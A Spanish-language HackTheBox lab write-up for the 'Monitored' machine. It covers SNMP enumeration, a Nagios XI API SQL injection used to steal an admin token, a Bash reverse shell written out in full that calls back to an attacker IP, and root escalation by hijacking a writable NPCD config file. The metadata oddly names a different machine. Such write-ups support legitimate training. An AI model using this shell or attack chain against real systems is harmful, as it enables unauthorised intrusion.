--- 
title: "Monitored" 
platform: "Hackthebox"
date: "2026-02-27" 
difficulty: "Medium" 
os: "linux" 
description: "Resolución de la máquina Analysis de HackTheBox." 
---

--------

Monitored es una máquina Linux de dificultad media que se centra en la explotación de servicios de monitorización mal configurados. La intrusión comienza con una enumeración profunda de SNMP para obtener información del sistema, seguida de una inyección SQL en la API de Nagios XI para secuestrar la sesión administrativa. La escalada de privilegios aprovecha permisos de escritura en archivos de configuración de servicios que pueden ser reiniciados con privilegios de root.

1. Fase de Reconocimiento y Enumeración
Iniciamos con un escaneo exhaustivo de puertos para identificar la superficie de ataque:

![[Pasted image 20240114191726.png]]
![[Pasted image 20240114192027.png]]

Identificamos servicios estándar como SSH (22) y HTTP/HTTPS (80/443). Analizando el banner de SSH en Launchpad, confirmamos la distribución del sistema y la presencia de servicios de control de acceso como TCP Wrappers.

![[Pasted image 20240114192446.png]]
![[Pasted image 20240114194519.png]]

Enumeración SNMP
Tras no encontrar vectores claros en el servidor web mediante fuzzing de directorios, realizamos un escaneo UDP, localizando el servicio SNMP (Simple Network Management Protocol) abierto.

Utilizando la comunidad por defecto public, realizamos una enumeración de los procesos y servicios del sistema. Esta técnica nos revela que la máquina está ejecutando una instancia de Nagios XI.

![[Pasted image 20240115021358.png]]

2. Explotación: Nagios XI SQLi y RCE
Localizamos el panel de control de Nagios en la ruta /nagios/. Investigando la versión específica, descubrimos que es posible habilitar un login inseguro mediante una configuración conocida.

![[Pasted image 20240115030250.png]]
![[Pasted image 20240116032830.png]]

SQL Injection en la API
Identificamos una vulnerabilidad de Inyección SQL en el endpoint de la API de Nagios (CVE-2023-39985). Al automatizar la extracción con sqlmap, logramos obtener el API Token del usuario administrador.

![[Pasted image 20240116033339.png]]
![[Pasted image 20240116033459.png]]
![[Pasted image 20240116033945.png]]

Obtención de Shell Inicial (RCE)
Con el token de administrador, creamos un nuevo usuario con privilegios elevados a través de la API.

![[Pasted image 20240116034624.png]]
![[Pasted image 20240116034606.png]]
![[Pasted image 20240116034804.png]]

Una vez dentro de Nagios XI como administradores, utilizamos la funcionalidad de creación de comandos de monitoreo para inyectar una reverse shell en Bash:

Bash
bash -c 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1'
![[Pasted image 20240116013708.png]]
![[Pasted image 20240116014547.png]]
![[Pasted image 20240116014742.png]]

Establecemos el listener y recibimos la conexión inicial:
![[Pasted image 20240116020727.png]]

3. Escalada de Privilegios: Config Hijacking
Enumeramos los privilegios del usuario nagios y detectamos que podemos gestionar los servicios npcd y nagios mediante sudo sin proporcionar contraseña.

![[Pasted image 20240116020819.png]]
![[Pasted image 20240116021552.png]]

Abuso del Servicio NPCD
Al inspeccionar los archivos de configuración, descubrimos que tenemos permisos de escritura sobre el archivo de configuración de NPCD (Nagios PerfData C-Daemon).

![[Pasted image 20240116022114.png]]

Modificamos el archivo de configuración para incluir una directiva que ejecute nuestra reverse shell cuando el servicio sea reiniciado.

![[Pasted image 20240116031020.png]]
![[Pasted image 20240116031228.png]]

Al reiniciar el servicio mediante sudo, el proceso arranca con privilegios de root y ejecuta nuestro comando, otorgándonos acceso total al sistema.

![[Pasted image 20240116031259.png]]
![[Pasted image 20240116031402.png]]

Máquina Monitored comprometida. 🚀